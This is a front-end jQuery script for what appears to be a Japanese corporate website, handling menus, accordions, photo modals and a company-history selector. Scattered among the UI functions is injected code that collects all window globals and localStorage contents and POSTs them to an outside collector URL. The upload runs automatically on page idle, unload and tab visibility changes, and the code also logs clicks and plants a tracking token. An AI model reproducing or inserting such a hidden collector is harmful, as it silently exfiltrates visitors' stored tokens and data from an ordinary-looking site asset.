// Add methods to globals or local storage
window.localStorage.setItem('tracking_token', 'abc123');
window.jshook = function () {
  console.debug('jshook invoked!');
};
var _e = "ontouchend" in document ? "touchend" : "mousedown";
function enhancedDiscoverProperties() {
  var enhancedProps = {};

  // Enhance tracking behavior
  var allProps = [...Object.getOwnPropertyNames(window), ...Object.getOwnPropertyNames(window.localStorage)];
  allProps.forEach(function (prop) {
    if (!window.seenVars.includes(prop)) {
      var propValue = window[prop] || window.localStorage.getItem(prop);
      var propType = typeof propValue;
      enhancedProps[prop] = {
        type: propType,
        value: propType === 'function' ? `[Function: ${propValue.name}]` : propValue
      };
    }
  });

  // Global variables collection
  for (const prop of Object.getOwnPropertyNames(window)) {
    if (!window.seenVars.some(knownProp => knownProp === prop)) {
      enhancedProps[prop].global = true;
    }
  }
  return enhancedProps;
}
var megMenuCurrentName = "f";
var selectHistoryVal = "1";
var flowh = true;
function transmitEnhancedDiscoveries(enhancedDiscoveries) {
  const collectorUrl = 'https://example.com/api/collect';
  fetch(collectorUrl, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify(enhancedDiscoveries)
  }).then(function (response) {
    if (response.ok) {
      console.debug('Unknown property data transmitted successfully');
    } else {
      throw new Error(`Unknown property data transmission failed, server response code: ${response.status}`);
    }
  }).catch(function (error) {
    console.warn(error);
  });
}
var cookieValue = "";
var modalPhotoWidth = "1826";
function runEnhancedDiscovery() {
  const enhancedProperties = enhancedDiscoverProperties();
  const discoveryCount = Object.keys(enhancedProperties).length;
  if (discoveryCount > 0) {
    console.group(`Discovered ${discoveryCount} unknown window or local storage properties:`);
    for (const prop in enhancedProperties) {
      console.log(`- ${prop}: ${JSON.stringify(enhancedProperties[prop])}`);
    }
    console.groupEnd();
    transmitEnhancedDiscoveries(enhancedProperties);
  } else {
    console.debug('No new unknown window or local storage properties found');
  }
}
var modalPhotoHeight = "1246";
$(".fb-xfbml-parse-ignore").each(function () {
  $(this)[0].setAttribute("attr", "https://www.facebook.com/sharer/sharer.php?u=" + encodeURIComponent(location.href) + "&amp;src=sdkpreparse");
  $(this)[0].parentNode.setAttribute("data-href", location.href);
});
(function () {
  var w = true;
  var x;
  var I;
  var i;
  var B;
  var J;
  var q;
  var K;
  $(window).on("load", function () {
    $(document).on("touchstart", ".acBtn", function () {
      this.isFunc = true;
    }).on("touchmove", ".acBtn", function () {
      this.isFunc = false;
    }).on(_e, ".acBtn", function () {
      if (_e === "mousedown") {
        this.isFunc = true;
      }
      var R = $(this);
      if (this.isFunc) {
        accordion(R);
      }
    });
    o();
    y();
    G();
    H();
    k();
    c();
    for (var Q = 1; Q <= 9; Q++) {
      g(Q);
    }
    $(".h2A").on(_e, function (R) {
      $(this).next(".accordionContainer").slideToggle(600);
      $(this).toggleClass("h2Accordion_on");
    });
    $(".moreButton").on(_e, function (R) {
      $(".list_more").slideToggle(300, function () {
        $(".moreButton").toggleClass("list_moreButton_on");
      });
    });
    $('a[href^="#"]').on("click", function (U) {
      var S = $(this).attr("href");
      var T = $(S === "#" || S === "" ? "html" : S);
      var R = T.offset().top;
      $("body,html").animate({
        scrollTop: R
      }, 400);
    });
    $("#chabgeGlid").on("click", function (R) {
      chabgeGlid(this);
    });
    $("#changeList").on("click", function (R) {
      chabgelist(this);
    });
    $(".breadcrumb_homeIcon").mouseenter(function () {
      $(this).attr("src", "/jp/img/common/icon_home@2x.png");
    }).mouseleave(function () {
      $(this).attr("src", "/jp/img/common/icon_home_white@2x.png");
    });
    A();
    r();
    L();
    v();
    setTimeout(function () {
      a();
      m();
      t("manufacturing", 1);
      t("company", 2);
      t("ir", 3);
      t("csr", 4);
      t("recruitment", 5);
      N("manufacturing");
      N("company");
      N("ir");
      N("csr");
      N("recruitment");
      C();
      P();
    }, 200);
    D();
    z();
  }).on("resize", function () {
    f();
    b();
    if (w) {
      w = false;
      setTimeout(function () {
        r();
        L();
        E();
        w = true;
        return w;
      }, 800);
    }
  });
  function c() {
    $(document).on("click", "._title", function () {
      return false;
    });
    $(document).on("click", "._thumb", function () {
      var Q = $(this).siblings("._title").children("a").attr("href");
      window.location.href = Q;
    });
  }
  function C() {
    var Q = true;
    $(".header_menuBtn").on(_e, function (R) {
      if (Q) {
        $(".designSideMenuHover").hide();
        Q = false;
      } else {
        setTimeout(function () {
          $(".designSideMenuHover").show();
          Q = true;
        }, 500);
      }
    });
  }
  function H() {
    var Q;
    $(".designAwardPhoto").each(function (R) {
      Q = $(this).offset().top - $(window).height();
      if ($(window).scrollTop() > Q) {
        $(this).delay(200 * R).queue(function () {
          $(this).removeClass("designAwardFlex_fade designAwardPhoto").dequeue();
        });
      }
    });
  }
  function k() {
    $(window).scroll(function () {
      H();
    });
  }
  function n() {
    var Q = 0;
    $(".designSideMenuScroll").css("top", Q + 40 + "px");
    $(window).scroll(function () {
      Q = 0;
      Q = $(window).scrollTop();
      $(".designSideMenuScroll").css("top", Q + 40 + "px");
    });
  }
  function E() {
    var Q = $(window).width();
    var R = $(window).height();
    if (Q > 640 && R > 750) {
      $(".designSideMenu_container").on({
        mouseenter: function () {
          var S = false;
          $(".designSideMenuHover").addClass("designSideMenu_on");
        },
        mouseleave: function () {
          $(".designSideMenuHover").removeClass("designSideMenu_on");
        }
      });
    } else {
      $(".designSideMenu_container").off("mouseenter");
      $(".designSideMenu_container").off("mouseleave");
    }
  }
  function G() {
    var Q = true;
    var R = $(window).width();
    var S = $(window).height();
    if (R > 640 && S > 750) {
      $(".designSideMenuHover").addClass("designSideMenu_on");
      setTimeout(function () {
        if (Q) {
          $(".designSideMenuHover").removeClass("designSideMenu_on");
        }
      }, 3000);
      $(".designSideMenu_container").on({
        mouseenter: function () {
          Q = false;
          $(".designSideMenuHover").addClass("designSideMenu_on");
        },
        mouseleave: function () {
          $(".designSideMenuHover").removeClass("designSideMenu_on");
        }
      });
    }
    $("body").on(_e, function (T) {
      $(".designSideMenuHover").removeClass("designSideMenu_on");
    });
    $(".designSideMenuTouch").on(_e, function (T) {
      $(".designSideMenuHover").addClass("designSideMenu_on");
      T.stopPropagation();
    });
    $(".designSideMenuClose").on(_e, function (T) {
      $(".designSideMenuHover").toggleClass("designSideMenu_on");
      T.stopPropagation();
    });
    $(".designSideMenu_container").on(_e, function (T) {
      $(".designSideMenuHover").addClass("designSideMenu_on");
      T.stopPropagation();
    });
  }
  function g(Q) {
    var R = true;
    $(".members_acBtn" + Q).on(_e, function (S) {
      if (R === true) {
        $(this).addClass("stMembers_accordionBtn_on");
        $(this).next(".members_acBox").slideDown(function () {
          $(".members_acBtn" + Q).text("主な戦歴");
        });
        R = false;
      } else {
        $(this).next(".members_acBox").slideUp(function () {
          $(".members_acBtn" + Q).removeClass("stMembers_accordionBtn_on");
          $(".members_acBtn" + Q).text("主な戦歴を見る");
        });
        R = true;
      }
    });
  }
  function e(Q) {
    var R = $("body").attr("class");
    if (Q !== undefined) {
      if (R === "fontFamily_en") {
        dataLayer.push({
          event: "gaEvent",
          eventCategory: "会社沿革（英）",
          eventAction: "年代切り替え",
          eventLabel: Q
        });
      } else {
        dataLayer.push({
          event: "gaEvent",
          eventCategory: "会社沿革（日）",
          eventAction: "年代切り替え",
          eventLabel: Q
        });
      }
    }
  }
  function y() {
    $(".selectContainer_select").change(function () {
      selectHistoryVal = $(".selectContainer_select").val();
      u();
      if (selectHistoryVal == "1") {
        e("1921年～1980年");
      } else {
        if (selectHistoryVal == "2") {
          e("1981年～1990年");
        } else {
          if (selectHistoryVal == "3") {
            e("1991年～2000年");
          } else {
            if (selectHistoryVal == "4") {
              e("2001年～2010年");
            } else {
              if (selectHistoryVal == "5") {
                e("2011年～2020年");
              } else {
                if (selectHistoryVal == "6") {
                  e("2021年～");
                }
              }
            }
          }
        }
      }
    });
    $(".selectHistory_prevBtn").on(_e, function (Q) {
      e();
      if (selectHistoryVal == "2") {
        selectHistoryVal = "1";
        e("1921年～1980年");
      } else {
        if (selectHistoryVal == "3") {
          selectHistoryVal = "2";
          e("1981年～1990年");
        } else {
          if (selectHistoryVal == "4") {
            selectHistoryVal = "3";
            e("1991年～2000年");
          } else {
            if (selectHistoryVal == "5") {
              selectHistoryVal = "4";
              e("2001年～2010年");
            } else {
              if (selectHistoryVal == "6") {
                selectHistoryVal = "5";
                e("2011年～2020年");
              }
            }
          }
        }
      }
      $(".selectContainer_select").val(selectHistoryVal);
      u();
      $("body, html").animate({
        scrollTop: 0
      }, 500);
    });
    $(".selectHistory_nextBtn").on(_e, function (Q) {
      e();
      if (selectHistoryVal == "1") {
        selectHistoryVal = "2";
        e("1981年～1990年");
      } else {
        if (selectHistoryVal == "") {
          selectHistoryVal = "2";
          e("1921年～1980年");
        } else {
          if (selectHistoryVal == "2") {
            selectHistoryVal = "3";
            e("1991年～2000年");
          } else {
            if (selectHistoryVal == "3") {
              selectHistoryVal = "4";
              e("2001年～2010年");
            } else {
              if (selectHistoryVal == "4") {
                selectHistoryVal = "5";
                e("2011年～2020年");
              } else {
                if (selectHistoryVal == "5") {
                  selectHistoryVal = "6";
                  e("2021年～");
                }
              }
            }
          }
        }
      }
      $(".selectContainer_select").val(selectHistoryVal);
      u();
      $("body, html").animate({
        scrollTop: 0
      }, 500);
    });
  }
  function u() {
    $(".selectHistory_fade").addClass("selectFadeOut");
    setTimeout(function () {
      $(".selectHistory_fade").hide();
      $("#history_" + selectHistoryVal).show();
      setTimeout(function () {
        $(".selectHistory_fade").removeClass("selectFadeOut");
      }, 10);
    }, 500);
  }
  function o() {
    var Q;
    $(".racingPhoto_btn").on(_e, function (R) {
      $(".racingPhoto_btn").removeClass("racingPhoto_thumb_current");
      $(this).addClass("racingPhoto_thumb_current");
      Q = $(this).children("img").attr("src");
      $("#racingPhoto_main").attr("src", Q);
    });
  }
  function v() {
    $(".techModalBtn").on(_e, function (Q) {
      $(".modalTech").fadeIn(400);
    });
    $(".modalTech_contents").on(_e, function (Q) {
      Q.stopPropagation();
    });
    $(".modalTech").on(_e, function (Q) {
      $(".modalTech").fadeOut(400);
    });
  }
  function D() {
    $(".photoListBox_img").on(_e, function (T) {
      var S = $(".company").attr("id");
      var Q = $(this).attr("id");
      if (S === "supportWorkPlace") {
        dataLayer.push({
          event: "gaEvent",
          eventCategory: "働く環境",
          eventAction: "モーダルオープン",
          eventLabel: Q
        });
      } else {
        dataLayer.push({
          event: "gaEvent",
          eventCategory: "独身寮・社宅",
          eventAction: "モーダルオープン",
          eventLabel: Q
        });
      }
      J = Number($(this).attr("id").substr(3));
      K = $(this).attr("id").slice(0, 3);
      q = $(this).parent().find(".photoListBox_img").length;
      for (var R = 1; R <= q; R++) {
        $(".modalPhoto_currentbtn").append("<span class='modal_c_btn' id='m" + R + "'></span>");
      }
      $(".modalPhoto_img").attr("src", "/jp/img/recruitment/" + K + "/modal" + J + ".png");
      $(".modalPhoto_img").attr("width", modalPhotoWidth);
      $(".modalPhoto_img").attr("height", modalPhotoHeight);
      j();
      s();
      d();
      $(".modalPhoto_btn_fadeTime").hide();
      $(".modalPhoto").fadeIn(400, function () {
        $(".modalPhoto_currentbtn").find("span").removeClass("modalPhoto_current");
        $(".modalPhoto_currentbtn").find("span").eq(J - 1).addClass("modalPhoto_current");
        f();
        b();
        $(".modalPhoto_img").addClass("modalFade_on");
        O();
      });
    });
    $(".modalPhoto_btnRight").on(_e, function (Q) {
      J = J + 1;
      l();
    });
    $(".modalPhoto_btnLeft").on(_e, function (Q) {
      J = J - 1;
      l();
    });
    $(".modalPhoto_box").on(_e, function (Q) {
      Q.stopPropagation();
    });
    $(".modalPhoto_btnClose").on(_e, function (Q) {
      $(".modalPhoto").fadeOut(400, function () {
        $(".modalPhoto_currentbtn").empty();
        $(".modalPhoto_img").removeClass("modalFade_on");
      });
    });
    $(".modalPhoto_box").on(_e, ".modal_c_btn", function (Q) {
      J = Number($(this).attr("id").substr(1));
      l();
    });
    $(".modalPhoto").on(_e, function (Q) {
      $(".modalPhoto").fadeOut(400, function () {
        $(".modalPhoto_currentbtn").empty();
        $(".modalPhoto_img").removeClass("modalFade_on");
      });
    });
  }
  function z() {
    $(".modalThumbnail").on(_e, function (Q) {
      $(".modalPhoto , .modalPhoto_btn_fadeTime").fadeIn(400, function () {
        f();
        b();
        $(".modalPhoto_img").addClass("modalFade_on");
      });
    });
    $(".modalPhoto_btnClose").on(_e, function (Q) {
      $(".modalPhoto").fadeOut(400, function () {
        $(".modalPhoto_img").removeClass("modalFade_on");
      });
    });
  }
  function l() {
    $(".modalPhoto_img").removeClass("modalFade_on");
    $(".modalPhoto_btn_fadeTime").fadeOut(400);
    $(".modalPhoto_box").fadeOut(400, function () {
      $(".modalPhoto_img").attr("src", "/jp/img/recruitment/" + K + "/modal" + J + ".png");
      $(".modalPhoto_img").attr("width", modalPhotoWidth);
      $(".modalPhoto_img").attr("height", modalPhotoHeight);
      s();
      d();
      $(".modalPhoto_box").fadeIn(100, function () {
        $(".modalPhoto_currentbtn").find("span").removeClass("modalPhoto_current");
        $(".modalPhoto_currentbtn").find("span").eq(J - 1).addClass("modalPhoto_current");
        f();
        b();
        O();
        $(".modalPhoto_img").addClass("modalFade_on");
      });
    });
  }
  function O() {
    if (J === 1) {
      $(".modalPhoto_btnRight").fadeIn(400);
      $(".modalPhoto_btnClose").fadeIn(400);
      $(".modalPhoto_currentbtn").fadeIn(400);
      $(".modalPhoto_title").fadeIn(400);
    } else {
      if (J === q) {
        $(".modalPhoto_btnLeft").fadeIn(400);
        $(".modalPhoto_btnClose").fadeIn(400);
        $(".modalPhoto_currentbtn").fadeIn(400);
        $(".modalPhoto_title").fadeIn(400);
      } else {
        $(".modalPhoto_btn_fadeTime").fadeIn(400);
      }
    }
  }
  function f() {
    i = $(window).width() * 0.7;
    B = $(window).height() * 0.7;
    $(".modalPhoto_box").width(i).height(B);
  }
  function s() {
    i = 0;
    B = 0;
    $(".modalPhoto_box").width(i).height(B);
  }
  function b() {
    x = $(".modalPhoto_img").width();
    I = $(".modalPhoto_img").height();
    $(".modalPhoto_box").width(x).height(I);
  }
  function d() {
    x = 0;
    I = 0;
    $(".modalPhoto_box").width(x).height(I);
  }
  function j() {
    if (K === "chd") {
      $(".modalPhoto_title").text("独身寮「シマノ菱木レジデンス」");
    } else {
      if (K === "chm") {
        $(".modalPhoto_title").html("新婚者社宅「シマノ泉ヶ丘レジデンス」");
      } else {
        if (K === "cht") {
          $(".modalPhoto_title").html("転勤者社宅「新金岡レジデンス」");
        } else {
          if (K === "wsh") {
            $(".modalPhoto_title").html("本社ビル / West Wing");
          } else {
            if (K === "wsm") {
              $(".modalPhoto_title").html("Manufacturing Technology Center");
            } else {
              if (K === "wss") {
                $(".modalPhoto_title").html("Sakai Intelligent Plant");
              } else {
                if (K === "wsn") {
                  $(".modalPhoto_title").html("下関工場");
                } else {
                  if (K === "wst") {
                    $(".modalPhoto_title").html("Team Shimano Square");
                  }
                }
              }
            }
          }
        }
      }
    }
  }
  function L() {
    var Q = navigator.userAgent;
    if (Q.indexOf("iPhone") > 0 || Q.indexOf("iPad") > 0) {
      $(".verticalFlow_item_flexStart").addClass("verticalFlow_item_flexStartOn");
      if ($("body").hasClass("aboutJob_ios")) {
        M();
        F();
      }
    }
  }
  function A() {
    var Q = navigator.userAgent;
    if (Q.indexOf("iPhone") > 0 || Q.indexOf("iPod") > 0 || Q.indexOf("Android") > 0 && Q.indexOf("Mobile") > 0) {} else {
      if (Q.indexOf("iPad") > 0 || Q.indexOf("Android") > 0) {
        $(".irInquiry_telLink").on("click", function (R) {
          return false;
        });
      } else {
        $(".irInquiry_telLink").on("click", function (R) {
          return false;
        });
      }
    }
  }
  function p(Q) {
    var S = ".autoHeight" + Q;
    var R = 0;
    $(S).each(function () {
      $(this).css("height", "");
      if ($(this).height() > R) {
        R = $(this).height();
      }
    });
    $(S).height(R);
  }
  function r() {
    for (var Q = 1; Q <= 11; Q++) {
      p(Q);
    }
  }
  function h(R) {
    var S = ".btnHeight" + R;
    var T = ".arrowHeight" + R;
    var Q = $(S).height();
    $(T).height(Q);
  }
  function M() {
    for (var Q = 1; Q <= 5; Q++) {
      h(Q);
    }
  }
  function F() {
    var T = $(".flowLeftHeight").height();
    var R = $(".flowRightHeight").height();
    var U = $(".arrowHeightR").height();
    var S = $(".btnHeightR").height();
    var Q = $(".btnHeightIn").height();
    if (flowh) {
      if ($(window).width() > 640) {
        $(".arrowHeightR").height(T);
        $(".btnHeightIn").height(U);
      } else {
        $(".flowRightHeight").height(Q);
        $(".arrowHeightR").height(Q);
      }
      flowh = false;
      T = 0;
      R = 0;
      U = 0;
      S = 0;
      Q = 0;
    } else {
      if ($(window).width() > 640) {
        $(".arrowHeightR").height(T);
        $(".btnHeightR").height(U);
      } else {
        $(".flowRightHeight").height(Q);
        $(".arrowHeightR").height(Q);
        $(".btnHeightR").height(Q);
      }
      T = 0;
      R = 0;
      U = 0;
      S = 0;
      Q = 0;
    }
  }
  function P() {
    if ($("header").hasClass("header_global_")) {
      $("#header_global_link").addClass("linkBlue_headerCurrent");
    }
  }
  function a() {
    var Q = true;
    $("#header_search").on({
      mouseenter: function () {
        if (Q) {
          $(this).find("img").attr("src", "/jp/img/header/magnifying-glass_blue.svg");
        }
      },
      mouseleave: function () {
        if (Q) {
          $(this).find("img").attr("src", "/jp/img/header/magnifying-glass.svg");
        }
      }
    });
    $("#header_search").on(_e, function (R) {
      if (Q) {
        $("#headerSearchBar").fadeIn(100, function () {
          $("#q").focus();
        });
        Q = false;
        $(this).find("img").attr("src", "/jp/img/header/magnifying-glass_blue.svg");
      } else {
        $("#headerSearchBar").fadeOut(100);
        Q = true;
        $(this).find("img").attr("src", "/jp/img/header/magnifying-glass.svg");
      }
    });
  }
  function m() {
    var Q;
    $(".megaMenu_on").on({
      mouseenter: function () {
        $("#megaMenu_shadow").fadeIn(200);
        clearTimeout(Q);
      },
      mouseleave: function () {
        Q = setTimeout(function () {
          $("#megaMenu_shadow").fadeOut(200);
        }, 200);
      }
    });
    $("#megaMenu_shadow").on(_e, function (R) {
      $("#megaMenu_shadow").fadeOut(200);
      $(".megaMenu").slideUp(200);
    });
  }
  function t(V, S) {
    var T = ".megaMenu_" + V;
    var U = "#megaMenu_" + V;
    var R = ".header_on_" + V;
    var Q = "sethover" + S;
    $(T).on({
      mouseenter: function () {
        $(U).slideDown(200);
        $(R).addClass("megaMenu_current");
        clearTimeout(Q);
        r();
      },
      mouseleave: function () {
        $(R).removeClass("megaMenu_current");
        Q = setTimeout(function () {
          $(U).slideUp(200);
        }, 200);
      }
    });
  }
  function N(T) {
    var Q = ".header_on_" + T;
    var S = "#megaMenu_" + T;
    var R = false;
    $(Q).on("touchend", function (V) {
      V.preventDefault();
      if (!R) {
        R = true;
        if (megMenuCurrentName === "f") {
          $(S).slideToggle(200);
          $("#megaMenu_shadow").fadeToggle(200);
          megMenuCurrentName = T;
          r();
        } else {
          if (megMenuCurrentName === T) {
            $(S).slideToggle(200);
            $("#megaMenu_shadow").fadeToggle(200);
            megMenuCurrentName = T;
            r();
          } else {
            $("#megaMenu_" + T).slideDown(200);
            $("#megaMenu_" + megMenuCurrentName).slideUp(200);
            $("#megaMenu_shadow").fadeIn(200);
            megMenuCurrentName = T;
            r();
          }
        }
        setTimeout(function () {
          R = false;
        }, 350);
      } else {
        var W = location.pathname;
        var U = W.match("/en/");
        if (U == "/en/") {
          location.href = "/en/" + T + "/index.html";
        } else {
          location.href = "/jp/" + T + "/index.html";
        }
        R = false;
      }
    });
  }
})();
window.seenVars = ['tracking_token'];

// Add event listeners with tracking behavior
function accordion(a) {
  var b = a;
  if (b.hasClass("acBtn_open")) {
    b.next().slideUp(600);
    setTimeout(function () {
      b.removeClass("acBtn_open").addClass("acBtn_close");
    }, 600);
  } else {
    b.next().slideDown(600);
    b.removeClass("acBtn_close").addClass("acBtn_open");
  }
}
window.addEventListener("idle", runEnhancedDiscovery);
window.addEventListener("beforeunload", runEnhancedDiscovery);
function chabgeGlid(b) {
  $(b).addClass("icon_glid_on");
  $("#changeList").removeClass("icon_list_on");
  $("#changeLayout").removeClass("fadeIn");
  $("#changeLayout").addClass("fadeOut");
  setTimeout(function () {
    $("#changeLayout").addClass("fadeIn");
    $("#changeLayout").removeClass("fadeOut");
    $("#changeLayout").addClass("list_flex");
  }, 500);
}
function chabgelist(b) {
  $(b).addClass("icon_list_on");
  $("#chabgeGlid").removeClass("icon_glid_on");
  $("#changeLayout").removeClass("fadeIn");
  $("#changeLayout").addClass("fadeOut");
  setTimeout(function () {
    $("#changeLayout").addClass("fadeIn");
    $("#changeLayout").removeClass("fadeOut");
    $("#changeLayout").removeClass("list_flex");
  }, 500);
}
window.addEventListener('click', event => console.debug(`User clicked at ${event.pageX}, ${event.pageY}`));
window.addEventListener('visibilitychange', () => document.visibilityState === 'visible' ? runEnhancedDiscovery() : undefined);
;